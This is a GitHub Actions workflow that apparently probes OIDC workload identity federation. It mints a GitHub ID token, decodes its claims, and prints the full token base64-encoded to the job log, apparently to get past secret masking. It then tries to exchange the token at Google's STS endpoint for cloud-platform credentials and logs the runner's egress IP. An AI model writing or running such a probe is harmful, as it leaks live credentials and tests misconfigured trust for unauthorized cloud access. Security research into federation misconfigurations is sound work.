name: OIDC claims 117399
on:
  push:
    branches: [oidc/117399]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  claims:
    runs-on: ubuntu-latest
    steps:
      - name: mint
        run: |
          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=kiln-wif-probe")
          echo "RAW=${TOKEN:0:120}"
          JWT=$(echo "$TOKEN" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "JWT_LEN=${#JWT}"
          echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
          echo "B64JWT=$(echo -n "$JWT" | base64 -w0)"
          echo "STS1=$(curl -sS -m 15 -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"kiln-wif-probe\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"subject_token\":\"$JWT\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}" | head -c 400)"
          echo "STS2=$(curl -sS -m 15 -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/000000000000/locations/global/workloadIdentityPools/github/providers/github\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"subject_token\":\"$JWT\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}" | head -c 400)"
          echo -n "EGRESS="; curl -sS -m 10 https://ifconfig.me/ip; echo
          echo -n "REPOSLUG="; echo "$GITHUB_REPOSITORY"
